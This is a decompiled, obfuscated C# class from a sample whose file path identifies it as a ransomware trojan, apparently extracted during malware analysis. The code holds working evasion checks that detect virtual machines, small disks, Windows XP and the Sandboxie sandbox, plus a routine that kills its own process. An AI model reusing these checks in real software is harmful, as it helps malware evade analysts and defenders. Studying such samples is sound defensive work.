// Decompiled with JetBrains decompiler
// Type: coxZRmDhvSAWo.c00000f
// Assembly: Worker-0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 6E50A6D0-CF23-40BF-9617-750EB84D00C0
// Assembly location: C:\Users\Administrateur\Downloads\ransomware_new\HEUR-Trojan-Ransom.Win32.Generic-122df846a943e419c3a31f65b6e67e7570134612b2dfd45638e0edd23e214036.exe

using Microsoft.VisualBasic.Devices;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Runtime.InteropServices;

namespace coxZRmDhvSAWo
{
  internal sealed class c00000f
  {
    [NonSerialized]
    internal static GetString f000048;

    public static void leUcrsvMUGz()
    {
      Process.GetCurrentProcess().Kill();
      Environment.FailFast((string) null);
    }

    private static bool m000022()
    {
      bool flag;
      try
      {
        if (new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize <= 61000000000L)
        {
          flag = true;
          goto label_4;
        }
      }
      catch
      {
      }
      flag = false;
label_4:
      return flag;
    }

    private static bool m000023()
    {
      bool flag;
      try
      {
        if (new ComputerInfo().OSFullName.ToLower().Contains("xp"))
        {
          flag = true;
          goto label_4;
        }
      }
      catch
      {
      }
      flag = false;
label_4:
      return flag;
    }

    private static bool m000024()
    {
      bool flag;
      try
      {
        using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
        {
          using (ManagementObjectCollection objectCollection = managementObjectSearcher.Get())
          {
            foreach (ManagementBaseObject managementBaseObject in objectCollection)
            {
              string lower = managementBaseObject["Manufacturer"].ToString().ToLower();
              if (lower == "microsoft corporation" && managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL") || lower.Contains("vmware") || managementBaseObject["Model"].ToString() == "VirtualBox")
              {
                flag = true;
                goto label_18;
              }
            }
          }
        }
      }
      catch
      {
      }
      flag = false;
label_18:
      return flag;
    }

    private static bool m000025()
    {
      try
      {
        return c00000f.GetModuleHandle("SbieDll.dll").ToInt32() != 0;
      }
      catch
      {
        return false;
      }
    }

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string p0);

    static c00000f() => Strings.CreateGetStringDelegate(typeof (c00000f));
  }
}
